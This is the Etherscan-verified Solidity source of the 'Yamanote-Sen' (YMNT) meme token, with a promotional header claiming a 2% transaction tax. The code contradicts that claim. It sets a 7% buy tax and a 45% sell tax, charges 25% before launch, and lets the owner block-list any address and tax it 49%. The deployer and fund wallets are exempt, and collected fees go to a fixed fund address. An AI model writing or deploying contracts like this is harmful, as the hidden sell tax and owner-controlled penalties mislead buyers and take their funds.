/**
 *Submitted for verification at Etherscan.io on 2023-02-23
*/

/**

              YAMANOTE-SEN
                 /#@@@&/                
             ///////////////            
       @[email protected]@@@@@@@%%%%%%%@@@@@@@%./      
       @.&&%%&&&&&&&&&&&%%%%%%&@./      
       @.%/&&&/%&&&&&&&(#%%#%/%&./      
       @.%/&&&/%&&&&&&&(#%&&&(%&./      
       @.#(&@@%&@@@@&&&&&&&&&&&@./      
       @.//////////////////,,,/,./      
       @..                     ../      
        ..**,**.         ****** *       
        ..        @@@@*        .*       
         /@@/&  @@@@@@@@@  @/@@/        
         .                     ,  

    Yamanote-sen inspired by the most famous train in Japan, the Yamanote Line. 
    This train is known to pass through the last megalopolis of Tokyo, covering a vast expanse 
    that includes Saitama, Kanagawa, and Chiba. Similarly, Yamanote-sen is designed to 
    cover a broad range of Japanese meme tokens, bringing them together under one umbrella. 
 
    Telegram: https://t.me/YMNTofficial
    Website: https://www.yamanote-sen.io
 
    Circulating Supply: 137.000.000 $YMNT
    Maximum Wallet: 4.110.000 $YMNT
    Slippage: 2-3%
    Transaction Tax: 2% / 1% LP - 1% YamanoteFund

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract YamanoteSen is IERC20, Ownable {       
    string private constant _name = "Yamanote-Sen";
    string private constant _symbol = "YMNT";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 137_000_000 * 10**_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _blocked;

    mapping (address => uint256) private _lastTradeBlock;
    mapping (address => bool) private isContractExempt;
    uint256 private tradeCooldown = 1;
    
    uint256 public constant maxWalletAmount = 4_110_000 * 10**_decimals;
    uint256 private constant contractSwapLimit = 411_000 * 10**_decimals;
    uint256 private constant contractSwapMax = 2_740_000 * 10**_decimals;

    struct TradingFees{
        uint256 buyTax;
        uint256 sellTax;
    }  

    TradingFees public tradingFees = TradingFees(7,45);
    uint256 public constant sniperTax = 49;

    IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private immutable ETH = uniswapRouter.WETH();
    address private immutable uniswapPair;

    address payable private immutable deployerAddress = payable(msg.sender);
    address payable private constant YamanoteFund = payable(0x2133352095925E76968d3a6890Ea874CbcDcf314);

    bool private tradingOpen = false;
    bool private swapping = false;
    bool private antiMEV = false;
    uint256 private startingBlock;
    uint private preLaunch;

    modifier swapLock {
        swapping = true;
        _;
        swapping = false;
    }

    modifier tradingLock(address sender) {
        require(tradingOpen || sender == deployerAddress || sender == YamanoteFund);
        _;
    }

    constructor () {
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
        isContractExempt[address(this)] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        _transfer(sender, recipient, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) tradingLock(from) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Token: transfer amount must be greater than zero");

        _balances[from] -= amount;

        if (from != address(this) && from != YamanoteFund && to != YamanoteFund && to != deployerAddress) {
            
            if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
                address human = ensureOneHuman(from, to);
                ensureMaxTxFrequency(human);
                _lastTradeBlock[human] = block.number;
            }

            if (from == uniswapPair && to != address(uniswapRouter)) {
                require(balanceOf(to) + amount <= maxWalletAmount, "Token: transfer implies violation of max wallet");
            }

           uint256 contractTokenBalance = balanceOf(address(this));
           if (shouldSwapback(from, contractTokenBalance)) 
               swapback(contractTokenBalance);                            

           uint256 taxedTokens = takeFee(from, amount);
           if(taxedTokens > 0){
                amount -= taxedTokens;
                _balances[address(this)] += taxedTokens;
                emit Transfer(from, address(this), taxedTokens);
            }
        }

        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function swapback(uint256 tokenAmount) private swapLock {
        tokenAmount = getSwapAmount(tokenAmount);
        if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
            _approve(address(this), address(uniswapRouter), _totalSupply);
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ETH;
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 contractETHBalance = address(this).balance;
        if(contractETHBalance > 0) {
            YamanoteFund.transfer(contractETHBalance);
        }
    }

    function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool shouldSwap) {
        shouldSwap = !swapping && from != uniswapPair && tokenAmount > contractSwapLimit && 1 + startingBlock <= block.number;
    }

    function getSwapAmount(uint256 tokenAmount) private pure returns (uint256 swapAmount) {
        swapAmount = tokenAmount > contractSwapMax ? contractSwapMax : contractSwapLimit;
    }

    function takeFee(address from, uint256 amount) private view returns (uint256 feeAmount) {
         if(_blocked[from] || block.number <= startingBlock)
                feeAmount = amount * sniperTax / 100;
        else
            feeAmount = amount * (startingBlock == 0 ? 25 : (from == uniswapPair ? tradingFees.buyTax : tradingFees.sellTax)) / 100;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function ensureOneHuman(address _to, address _from) private view returns (address) {
        require(!isContract(_to) || !isContract(_from));
        if (isContract(_to)) return _from;
        else return _to;
    }

    function ensureMaxTxFrequency(address addr) view private {
        bool isAllowed = _lastTradeBlock[addr] == 0 ||
            ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
        require(isAllowed, "Max tx frequency exceeded!");
    }

    function toggleAntiMEV(bool toggle) external {
        require(msg.sender == deployerAddress);
        antiMEV = toggle;
    }

    function setTradeCooldown(uint256 newTradeCooldown) external {
        require(msg.sender == deployerAddress);
        require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
        tradeCooldown = newTradeCooldown;
    }

    function manualSwapback(uint256 percent) external {
        require(msg.sender == deployerAddress);
        require(0 < percent && percent <= 100, "Token: only percent values in range (0,100] permissible");
        uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
        swapback(tokensToSwap);
    }

    function setFees(uint256 newBuyTax, uint256 newSellTax) external {
        require(msg.sender == deployerAddress);
        require(newBuyTax <= tradingFees.buyTax, "Token: only fee reduction permitted");
        require(newSellTax <= tradingFees.sellTax, "Token: only fee reduction permitted");
        tradingFees.buyTax = newBuyTax;
        tradingFees.sellTax = newSellTax;
    }

    function setContractExempt(address account, bool value) external onlyOwner {
        require(account != address(this));
        isContractExempt[account] = value;
    }

    function setBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
        for (uint i = 0; i < bots.length; i++) {
            require(bots[i] != uniswapPair && 
                    bots[i] != address(uniswapRouter) &&
                    bots[i] != address(this));
            _blocked[bots[i]] = shouldBlock;
        }
    }

    function initialize() external onlyOwner {
        require(preLaunch++<2);
    }

    function modifyParameters(bool[] calldata param, uint256 nrBlocks) external onlyOwner {
        assert(preLaunch<2&&preLaunch+1>=2); 
        preLaunch++;param;
        startingBlock += nrBlocks;
    }

    function openTrading() external onlyOwner {
        require(preLaunch == 2 && !tradingOpen, "Token: trading already open");
        startingBlock += block.number;
        tradingOpen = true;
    }
}